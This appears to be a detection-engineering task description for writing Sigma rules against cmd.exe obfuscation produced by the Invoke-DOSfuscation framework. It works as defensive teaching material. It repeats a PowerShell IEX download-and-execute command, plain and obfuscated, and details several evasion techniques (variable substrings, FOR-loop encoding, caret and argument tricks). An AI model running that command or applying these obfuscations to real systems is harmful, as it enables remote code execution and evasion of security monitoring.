## Summary

- Tool: Invoke-DOSfuscation — cmd.exe command obfuscation framework
- Author: Daniel Bohannon, @danielhbohannon
- Type: Offensive tool, threat simulation
- Materials:
    * Presentation from Black Hat Asia 2018 [Techniques FOR %F IN (-style) DO (S-level CMD Obfuscation)](https://i.blackhat.com/briefings/asia/2018/asia-18-bohannon-invoke_dosfuscation_techniques_for_fin_style_dos_level_cmd_obfuscation.pdf) and the talk on [YouTube](https://www.youtube.com/watch?v=mej5L9PE1fs)
    * [WHITE PAPER | DOSFUSCATION: EXPLORING THE DEPTHS OF CMD.EXE OBFUSCATION & DETECTION TECHNIQUES](https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/dosfuscation-report.pdf)

## Problem

The majority (>50%) of Sigma rules are based on command-line events (WEL Security Event ID 4688 and Sysmon Event ID 1), but the presence of Sigma rules for cmd.exe command Obfuscation Indicators detection is quite limited.

There is only one Sigma rule that is focusing on cmd.exe commandline obfuscation detection — [rules/windows/process_creation/win_susp_cli_escape.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_cli_escape.yml). The most of the methods, supported by [Invoke-DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation) are not covered at all.

## Solution

We developed a table with pre-generated CMD commands, obfuscated by the [Invoke-DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation) framework, you can pick up some of the tasks in that table and develop Sigma rules for them.<br>
You will need to use [regular expressions](https://github.com/Neo23x0/sigma/wiki/Specification#types) in Sigma rules. Here is a [Sigma rule](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_invoke_obfuscation_obfuscated_iex_commandline.yml) developed by Daniel Bohannon (@danielhbohannon) that utilize regular expressions in Sigma rule:
```YAML
title: Invoke-Obfuscation Obfuscated IEX Invocation
id: 4bf943c6-5146-4273-98dd-e958fd1e3abf
description: "Detects all variations of obfuscated powershell IEX invocation code generated by Invoke-Obfuscation framework from the following code block \u2014 https://github.com/danielbohannon/Invoke-Obfuscation/blob/master/Out-ObfuscatedStringCommand.ps1#L873-L888"
status: experimental
author: Daniel Bohannon (@Mandiant/@FireEye), oscd.community
date: 2019/11/08
tags:
    - attack.defense_evasion
    - attack.t1027
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        - CommandLine|re: '\$PSHome\[\s*\d{1,3}\s*\]\s*\+\s*\$PSHome\['
        - CommandLine|re: '\$ShellId\[\s*\d{1,3}\s*\]\s*\+\s*\$ShellId\['
        - CommandLine|re: '\$env:Public\[\s*\d{1,3}\s*\]\s*\+\s*\$env:Public\['
        - CommandLine|re: '\$env:ComSpec\[(\s*\d{1,3}\s*,){2}'
        - CommandLine|re: '\*mdr\*\W\s*\)\.Name'
        - CommandLine|re: '\$VerbosePreference\.ToString\('
        - CommandLine|re: '\String\]\s*\$VerbosePreference'
    condition: selection
falsepositives:
    - Unknown
level: high
```

## The Approach

The framework provides 3 main obfuscation options:
* BINARY - Obfuscated binary syntax for cmd.exe & powershell.exe
* ENCODING - Environment variable encoding
* PAYLOAD - Obfuscated payload via DOSfuscation

### BINARY (Environment Variable Substrings and For Loop)
#### Environment Variable Substrings
One way to obfuscate the string PowerShell in this example command:
```CMD
cmd.exe /c “powershell.exe IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/L3g1t’)”
```
is to substitute individual characters with substrings of existing environment variable values. For example, executing the internal command ```set``` displays all environment variable name and value pairs.<br>
![binex 1](https://i.ibb.co/0yWVwQz/image.png)<br>
The ```ALLUSERSPROFILE``` environment variable contains the character ```r``` at the 4th and 7th indexes. These single characters can be retrieved using cmd.exe’s native substring functionality: ```%ALLUSERSPROFILE:~4,1%``` or ```%ALLUSERSPROFILE:~7,1%```.<br>
![binex 2](https://i.ibb.co/crTRJ94/image.png)<br>
Substituting the character ```r``` in PowerShell produces: ```Powe%ALLUSERSPROFILE:~4,1%Shell```. Adding this obfuscation back into the sample malicious command results in:
```CMD
cmd.exe /c “Powe%ALLUSERSPROFILE:~4,1%Shell.exe IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/L3g1t’)”
```
![binex 3](https://i.ibb.co/HK50bQW/image.png)<br>
This is how it's going to look in WEL Security Event ID 4688:
```XML
- <EventData>
  <Data Name="SubjectUserSid">S-1-5-21-260327305-1582946090-2061753030-500</Data> 
  <Data Name="SubjectUserName">user</Data> 
  <Data Name="SubjectDomainName">WIN-JHK6BC88K34</Data> 
  <Data Name="SubjectLogonId">0x1cf8c72</Data> 
  <Data Name="NewProcessId">0xa44</Data> 
  <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data> 
  <Data Name="TokenElevationType">%%1936</Data> 
  <Data Name="ProcessId">0x108</Data> 
  <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c "powe%ALLUSERSPROFILE:~4,1%shell.exe IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/L3g1t’)" </Data> 
  </EventData>
```
However in child Process Creation WEL Security Event ID 4688 existing environment variables resolve to their underlying value when executed by cmd.exe, even when substring syntax is used:
```XML
- <EventData>
  <Data Name="SubjectUserSid">S-1-5-21-260327305-1582946090-2061753030-500</Data> 
  <Data Name="SubjectUserName">user</Data> 
  <Data Name="SubjectDomainName">WIN-JHK6BC88K34</Data> 
  <Data Name="SubjectLogonId">0x1cf8c72</Data> 
  <Data Name="NewProcessId">0x10d8</Data> 
  <Data Name="NewProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data> 
  <Data Name="TokenElevationType">%%1936</Data> 
  <Data Name="ProcessId">0xa44</Data> 
  <Data Name="CommandLine">powershell.exe IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/L3g1t’)</Data> 
  </EventData>
```
So this subtype of binary obfuscation is considered out of scope for this Issue.

#### For Loop
The same as with Environment Variable Substrings if you use For Loop then in the last child Process Creation WEL Security Event ID 4688 existing environment variables resolve to their underlying value. E.g. if we'll use this example command:
```CMD
C:\>cmd /c "FOR /F "delims=6M. tokens=2" %Z IN ('ftype^|findstr lMo')DO %Z IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/L3g1t')"

```
we'll see the following parent-child process creation chain in WEL:
```XML
 <Data Name="NewProcessId">0x990</Data> 
 <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data> 
 <Data Name="CommandLine">cmd /c "FOR /F "delims=6M. tokens=2" %Z IN ('ftype^|findstr lMo')DO %Z IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/L3g1t')"</Data> 
>
 <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
 <Data Name="ProcessId">0x990</Data> 
 <Data Name="CommandLine">C:\Windows\system32\cmd.exe /c ftype|findstr lMo</Data> 
>
 <Data Name="NewProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data> 
 <Data Name="ProcessId">0x990</Data> 
 <Data Name="CommandLine">PowerShell IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/L3g1t')</Data> 
```
So this subtype of binary obfuscation is considered out of scope for this Issue.

Therefore all binary obfuscation is considered out of scope for this Issue.

### ENCODING
Substrings of existing environment variables can be used to encode entire batch file contents or select portions of commands. The payload encoding techniques in these samples only affect static detections because these encodings do not remain in the dynamic execution of external commands in the batch files, so they are considered out of scope for this Issue.

### PAYLOAD
As pointed by the author (Daniel Bohannon (@danielhbohannon)) himself, there are numerous building blocks that must be combined to perform the advanced payload encoding techniques. Searching for these building blocks in process arguments, common persistence locations and in file repositories is a good first step in reducing the data set when building robust detections for DOSfuscation in general. We're going to use Sigma so we'll be looking for those building blocks in command-line events (WEL Security Event ID 4688 and Sysmon Event ID 1).

Some basic building block concepts for each of the advanced encoding techniques are outlined below, ```netstat -ano``` is used as an example command:
* Concatenation
   * Numerous ```set``` commands + logical operators ```&``` or ```&&``` + ```call``` command 
   ```cmd
   cmd /c “set com3= /ano&&set com2=stat&&set com1=net&& call set final=%com1%%com2%%com3%&&call%final%”
   ```
   * Multiple adjacent environment variables for concatenation reassembly
   ``` cmd
   cmd /c “set com3= /ano&&set com2=stat&&set com1=net&& call set final=%com1%%com2%%com3%&&call %final%”
   ```
   
* FORcoding
   * ```set``` command + for loop syntax + variable substring syntax like  ```!var:~%A,1!``` + ```if``` statement + ```callcommand``` + variable substring syntax like ```%var:~7%```, ```%var:~-12%``` or ```!var:~%A,1!```
   ``` cmd
   cmd /V:ON /C “set unique=nets/ao&&FOR %AIN (0 1 2 3 2 6 2 4 5 6 0 7 1337) DO set final=!final!!unique:~%A,1!&&IF %A==1337 CALL %final:~-12%”
   ```
   
* Reversal
   * Similar to #2 (FORcoding) but can include the for loop’s ```/L``` argument + start/increment/end integers
   ```cmd
   cmd /V:ON /C “set reverse=ona/ tatsten&& FOR /L %AIN (11 -1 0) DO set final=!final!!reverse:~%A,1!&&IF %A==0 CALL %final:~-12%”
   ```
   
* FINcoding
   * Numerous ```set``` commands + multiple string substitutions like ```%var:Z=t%``` or ```!var:e=7!``` or string removals like ```%var:@=%```
   ```cmd
   cmd /V:ON /C “set command=neZsZ7Z /7no&&  set sub2=!command:7=a!&&set sub1=!sub2:Z=t!&&CALL %sub1%”
   ```
The above building block suggestions are extremely basic and should merely serve as a starting point for detection development. However, this should begin reducing the amount of data returned from initial searches. In the case of small environments there may not be much noise at all to filter out. However, in other environments there might be one of many enterprise applications that legitimately uses for loops, variable substrings and concatenated strings on the command line in high quantities. In these environments multiple iterations and layers of detection tuning may be required.

Another example is CMD argument obfuscation. An obvious first choice would be anchoring these detections on process executions with arguments containing ```/C```, but there are numerous pitfalls to consider if using this approach:
* Whitespace is not required before or after the ```/C``` argument: ```cmd/Ccalc```
* Caret characters can break up the argument: ```cmd^/^C^calc```
* Even if detection authors account for whitespace and caret obfuscation characters applied to the ```/C``` argument, cmd.exe’s help menu states that “for compatibility reasons...```/R``` is the same as ```/C```.” So ```cmd/Ccalc``` is the same as ```cmd/Rcalc```.<br>

Another anchor character term in many of the payload encoding techniques is the ```/V:ON``` argument for enabling delayed environment variable expansion. However, it too is subject to several pitfalls:
* Whitespace is not required before or after the ```/V:ON``` argument: ```cmd/V:ON/Ccalc```
* Caret characters can break up the argument: ```cmd^/^V^:^O^N^/Ccalc```   
* ```/V:ON``` can also be written as ```/V:O```, ```/V:```, ```/V```, and (barring some minor syntax exceptions and the ```/V:OFF``` argument) any combination of characters after ```/V``` including ```/VeryObfuscated```, ```/VivaLaVida```, ```/V_--_==```, etc.
* It is also worth noting that in the context of cmd.exe’s arguments, ```\C``` means nothing if appearing before ```/C```. An example intended to throw off visual inspection of command line arguments would be ```cmd.exe \C echo %PATH%``` <100’s of whitespace characters> ```/C netstat /ano``` where everything before ```/C``` is ignored.

Considering all this we developed a table with pre-generated CMD commands, obfuscated by the [Invoke-DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation) framework, to achieve our main goal to detect the obfuscation method looking for similar patterns in all of it obfuscation examples.

### A little tip for the regex development

You can copy all pre-generated obfuscated powershell one-liners from a particular task (that are generated by a specific obfuscation method) and paste them to [regex101](https://regex101.com/) web-app for regular expression development. It will simplify the process a lot, and help you to find patterns to detect. (you can save your progress there and even apply a dark theme (: ). 

### Case Sensitivity

We consider that we're able to apply all regexes as not case sensitive or that all events are lowercased in a log pipeline before indexing in SIEM/LM system.

### Framework coverage
For fuzzing and deep exploration of the numerous tuning options for each obfuscation category, it is recommended that the individual functions be used directly outside of the Invoke-DOSfuscation function wrapper.

## Tasks




Daniel Bohannon (@danielhbohannon) provided 1000 sample commands in the [Samples](https://github.com/danielbohannon/Invoke-DOSfuscation/tree/master/Samples) directory of the [Invoke-DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation) repo broken out across each of the four advanced payload obfuscation functions. 
